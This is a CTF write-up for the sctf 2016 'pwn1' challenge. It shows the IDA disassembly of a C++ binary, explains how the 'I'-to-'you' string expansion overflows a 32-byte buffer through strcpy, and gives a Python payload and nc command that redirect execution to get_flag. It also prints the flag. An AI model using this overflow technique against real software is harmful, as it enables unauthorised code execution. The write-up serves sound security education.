## pwn1 - 70 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2016-4-15

### Problem ###
I'll convert a first person statement to a second person statement. I even wrote it in C++ to be super-safe about my strings!
`nc problems2.2016q1.sctf.io 1337`

### Hint ###
None

## Answer ##

### Overview ###
Figure out how to cause a buffer overflow and set eip to the get_flag.

### Details ###

Upon opening the binary up in a disassembler you'll immediately notice the call to a function named `vuln` in main. This is most likely where the vulnerability lies to we go into it.

Inside this function theres a bunch of nonsense C++ std::string stuff but you don't really need to analyze any of it, it looks straightforward enough.

IDA outputs:

```asm
.text:080491AF                                      public vuln
.text:080491AF                      vuln            proc near               ; CODE XREF: main+6p
.text:080491AF
.text:080491AF                      s               = byte ptr -3Ch
.text:080491AF                      var_1C          = byte ptr -1Ch
.text:080491AF                      var_18          = byte ptr -18h
.text:080491AF                      var_11          = byte ptr -11h
.text:080491AF                      var_10          = byte ptr -10h
.text:080491AF                      var_9           = byte ptr -9
.text:080491AF                      var_4           = dword ptr -4
.text:080491AF
.text:080491AF 55                                   push    ebp
.text:080491B0 89 E5                                mov     ebp, esp
.text:080491B2 53                                   push    ebx
.text:080491B3 83 EC 54                             sub     esp, 54h
.text:080491B6 C7 04 24 00 98 04 08                 mov     dword ptr [esp], offset format ; "Tell me something about yourself: "
.text:080491BD E8 5E FB FF FF                       call    _printf
.text:080491C2 A1 A4 B0 04 08                       mov     eax, ds:_edata
.text:080491C7 89 44 24 08                          mov     [esp+8], eax    ; stream
.text:080491CB C7 44 24 04 20 00 00+                mov     dword ptr [esp+4], 20h ; n
.text:080491D3 8D 45 C4                             lea     eax, [ebp+s]
.text:080491D6 89 04 24                             mov     [esp], eax      ; s
.text:080491D9 E8 92 FA FF FF                       call    _fgets
.text:080491DE 8D 45 C4                             lea     eax, [ebp+s]
.text:080491E1 89 44 24 04                          mov     [esp+4], eax
.text:080491E5 C7 04 24 AC B0 04 08                 mov     dword ptr [esp], offset input
.text:080491EC E8 DF F9 FF FF                       call    __ZNSsaSEPKc    ; std::string::operator=(char const*)
.text:080491F1 8D 45 EF                             lea     eax, [ebp+var_11]
.text:080491F4 89 04 24                             mov     [esp], eax
.text:080491F7 E8 94 FB FF FF                       call    __ZNSaIcEC1Ev   ; std::allocator<char>::allocator(void)
.text:080491FC 8D 45 EF                             lea     eax, [ebp+var_11]
.text:080491FF 89 44 24 08                          mov     [esp+8], eax
.text:08049203 C7 44 24 04 23 98 04+                mov     dword ptr [esp+4], offset aYou ; "you"
.text:0804920B 8D 45 E8                             lea     eax, [ebp+var_18]
.text:0804920E 89 04 24                             mov     [esp], eax
.text:08049211 E8 EA FA FF FF                       call    __ZNSsC1EPKcRKSaIcE ; std::string::string(char const*,std::allocator<char> const&)
.text:08049216 8D 45 F7                             lea     eax, [ebp+var_9]
.text:08049219 89 04 24                             mov     [esp], eax
.text:0804921C E8 6F FB FF FF                       call    __ZNSaIcEC1Ev   ; std::allocator<char>::allocator(void)
.text:08049221 8D 45 F7                             lea     eax, [ebp+var_9]
.text:08049224 89 44 24 08                          mov     [esp+8], eax
.text:08049228 C7 44 24 04 27 98 04+                mov     dword ptr [esp+4], offset aI ; "I"
.text:08049230 8D 45 F0                             lea     eax, [ebp+var_10]
.text:08049233 89 04 24                             mov     [esp], eax
.text:08049236 E8 C5 FA FF FF                       call    __ZNSsC1EPKcRKSaIcE ; std::string::string(char const*,std::allocator<char> const&)
.text:0804923B 8D 45 E4                             lea     eax, [ebp+var_1C]
.text:0804923E 8D 55 E8                             lea     edx, [ebp+var_18]
.text:08049241 89 54 24 0C                          mov     [esp+0Ch], edx
.text:08049245 8D 55 F0                             lea     edx, [ebp+var_10]
.text:08049248 89 54 24 08                          mov     [esp+8], edx
.text:0804924C C7 44 24 04 AC B0 04+                mov     dword ptr [esp+4], offset input
.text:08049254 89 04 24                             mov     [esp], eax      ; std::string *
.text:08049257 E8 C5 FC FF FF                       call    replace
.text:0804925C 83 EC 04                             sub     esp, 4
.text:0804925F 8D 45 E4                             lea     eax, [ebp+var_1C]
.text:08049262 89 44 24 04                          mov     [esp+4], eax
.text:08049266 C7 04 24 AC B0 04 08                 mov     dword ptr [esp], offset input
.text:0804926D E8 7E FB FF FF                       call    __ZNSsaSERKSs   ; std::string::operator=(std::string const&)
.text:08049272 8D 45 E4                             lea     eax, [ebp+var_1C]
.text:08049275 89 04 24                             mov     [esp], eax      ; this
.text:08049278 E8 53 FA FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:0804927D 8D 45 F0                             lea     eax, [ebp+var_10]
.text:08049280 89 04 24                             mov     [esp], eax      ; this
.text:08049283 E8 48 FA FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:08049288 8D 45 F7                             lea     eax, [ebp+var_9]
.text:0804928B 89 04 24                             mov     [esp], eax
.text:0804928E E8 AD FA FF FF                       call    __ZNSaIcED1Ev   ; std::allocator<char>::~allocator()
.text:08049293 8D 45 E8                             lea     eax, [ebp+var_18]
.text:08049296 89 04 24                             mov     [esp], eax      ; this
.text:08049299 E8 32 FA FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:0804929E 8D 45 EF                             lea     eax, [ebp+var_11]
.text:080492A1 89 04 24                             mov     [esp], eax
.text:080492A4 E8 97 FA FF FF                       call    __ZNSaIcED1Ev   ; std::allocator<char>::~allocator()
.text:080492A9 C7 04 24 AC B0 04 08                 mov     dword ptr [esp], offset input ; this
.text:080492B0 E8 5B F9 FF FF                       call    __ZNKSs5c_strEv ; std::string::c_str(void)
.text:080492B5 89 44 24 04                          mov     [esp+4], eax    ; src
.text:080492B9 8D 45 C4                             lea     eax, [ebp+s]
.text:080492BC 89 04 24                             mov     [esp], eax      ; dest
.text:080492BF E8 4C FA FF FF                       call    _strcpy
.text:080492C4 8D 45 C4                             lea     eax, [ebp+s]
.text:080492C7 89 44 24 04                          mov     [esp+4], eax
.text:080492CB C7 04 24 29 98 04 08                 mov     dword ptr [esp], offset aSoS ; "So, %s\n"
.text:080492D2 E8 49 FA FF FF                       call    _printf
.text:080492D7 EB 4F                                jmp     short loc_8049328
.text:080492D9                      ; ---------------------------------------------------------------------------
.text:080492D9 89 C3                                mov     ebx, eax
.text:080492DB 8D 45 E4                             lea     eax, [ebp+var_1C]
.text:080492DE 89 04 24                             mov     [esp], eax      ; this
.text:080492E1 E8 EA F9 FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:080492E6 EB 02                                jmp     short loc_80492EA
.text:080492E8                      ; ---------------------------------------------------------------------------
.text:080492E8 89 C3                                mov     ebx, eax
.text:080492EA
.text:080492EA                      loc_80492EA:                            ; CODE XREF: vuln+137j
.text:080492EA 8D 45 F0                             lea     eax, [ebp+var_10]
.text:080492ED 89 04 24                             mov     [esp], eax      ; this
.text:080492F0 E8 DB F9 FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:080492F5 EB 02                                jmp     short loc_80492F9
.text:080492F7                      ; ---------------------------------------------------------------------------
.text:080492F7 89 C3                                mov     ebx, eax
.text:080492F9
.text:080492F9                      loc_80492F9:                            ; CODE XREF: vuln+146j
.text:080492F9 8D 45 F7                             lea     eax, [ebp+var_9]
.text:080492FC 89 04 24                             mov     [esp], eax
.text:080492FF E8 3C FA FF FF                       call    __ZNSaIcED1Ev   ; std::allocator<char>::~allocator()
.text:08049304 8D 45 E8                             lea     eax, [ebp+var_18]
.text:08049307 89 04 24                             mov     [esp], eax      ; this
.text:0804930A E8 C1 F9 FF FF                       call    __ZNSsD1Ev      ; std::string::~string()
.text:0804930F EB 02                                jmp     short loc_8049313
.text:08049311                      ; ---------------------------------------------------------------------------
.text:08049311 89 C3                                mov     ebx, eax
.text:08049313
.text:08049313                      loc_8049313:                            ; CODE XREF: vuln+160j
.text:08049313 8D 45 EF                             lea     eax, [ebp+var_11]
.text:08049316 89 04 24                             mov     [esp], eax
.text:08049319 E8 22 FA FF FF                       call    __ZNSaIcED1Ev   ; std::allocator<char>::~allocator()
.text:0804931E 89 D8                                mov     eax, ebx
.text:08049320 89 04 24                             mov     [esp], eax
.text:08049323 E8 A8 FA FF FF                       call    __Unwind_Resume
.text:08049328                      ; ---------------------------------------------------------------------------
.text:08049328
.text:08049328                      loc_8049328:                            ; CODE XREF: vuln+128j
.text:08049328 8B 5D FC                             mov     ebx, [ebp+var_4]
.text:0804932B C9                                   leave
.text:0804932C C3                                   retn
.text:0804932C                      vuln            endp```

This looks simple enough if you know C++ you don't even need to read the `replace` function to understand.

You'll notice weird ~std::string things which you can ignore, its just the destructors for the strings, which will execute after all the actual code is done. 

It roughly translates to:

```c
void vuln()
{
	char buffer[32];
	printf("Greeting");
	fgets(buffer, 32, stdin);
	// Not sure if the parameters are right here but the idea is the same.
	std::string fixed = replace(std::string(buffer), std::string("I"), std::string("you"));
	strcpy(buffer, fixed.c_str());
	printf("So %s\n", buffer);
}```

To exploit this, since the original input buffer is limited to 32 characters, we need to get at least 4 bytes of the buffer to the return address, located at 0x40 above the start of the buffer. `get_flag` is at 0x08048f0d.

```python
print ('I' * 21) + 'a'  + ('\x0d\x8f\x04\x08')```

This should get the ptr to exactly where we need it and get the flag. Because 21 * 3 is 63 + 1 is 64 == 0x40. Then the address we want.

Now we just pipe this into the service like `python pwn1.py | nc problems2.2016q1.sctf.io 1337`

and get the flag.

### Flag ###

`sctf{strcpy_was_a_mistake}`
